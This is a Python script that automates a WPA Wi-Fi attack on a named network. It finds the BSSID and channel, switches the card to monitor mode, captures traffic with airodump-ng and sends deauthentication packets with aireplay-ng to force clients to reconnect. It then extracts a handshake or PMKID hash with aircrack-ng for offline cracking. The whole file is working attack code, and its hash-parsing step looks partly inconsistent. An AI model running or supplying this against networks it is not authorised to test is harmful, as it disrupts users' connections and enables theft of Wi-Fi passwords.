import os
import time
import re
import subprocess
import sys

CAPTURE_DIR = os.path.join(os.path.dirname(__file__), "capture")
HANDSHAKE_FILE = os.path.join(CAPTURE_DIR, "handshake.cap")
HASH_FILE = os.path.join(CAPTURE_DIR, "handshake.txt")

# Ensure capture directory exists
os.makedirs(CAPTURE_DIR, exist_ok=True)

def get_network_details(ssid):
    """Scans and retrieves BSSID and channel of the selected network."""
    networks = os.popen("sudo iwlist wlan0 scan").read()
    match = re.search(rf'Cell .*?\n.*?Address: ([\w:]+).*?\n.*?Channel (\d+).*?\n.*?ESSID:"{ssid}"', networks, re.DOTALL)
    if match:
        return match.group(1), match.group(2)
    return None, None

def capture_handshake(ssid):
    """Captures WPA handshake and extracts hash."""
    bssid, channel = get_network_details(ssid)
    if not bssid:
        print(f"[-] Network '{ssid}' not found.")
        return

    print(f"[*] Capturing handshake for {ssid} (BSSID: {bssid}, Channel: {channel})")

    # Ensure wlan0 is in monitor mode
    os.system("sudo airmon-ng check kill")
    os.system("sudo airmon-ng start wlan0")

    capture_command = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {HANDSHAKE_FILE} wlan0mon"
    deauth_command = f"sudo aireplay-ng --deauth 20 -a {bssid} wlan0mon"

    try:
        proc = subprocess.Popen(capture_command, shell=True)
        time.sleep(10)
        os.system(deauth_command)
        time.sleep(5)
        proc.terminate()
        os.system("sudo pkill airodump-ng")

        print("[+] Handshake captured! Extracting hash...")
        extract_hash()
    except Exception as e:
        print(f"[-] Error during handshake capture: {e}")

def extract_hash():
    """Extracts the hash from handshake capture and saves it."""
    cap_file = HANDSHAKE_FILE + "-01.cap"
    if not os.path.exists(cap_file):
        print("[-] Handshake file not found.")
        return

    hash_output = os.popen(f"sudo aircrack-ng -J {HASH_FILE} {cap_file}").read()
    match = re.search(r'PMKID: ([\w]+)', hash_output)

    if match:
        with open(HASH_FILE, "w") as file:
            file.write(match.group(1))
        print(f"[+] Handshake hash saved in {HASH_FILE}")
    else:
        print("[-] No handshake hash extracted.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("[-] Usage: python3 capture.py <SSID>")
        sys.exit(1)

    capture_handshake(sys.argv[1])
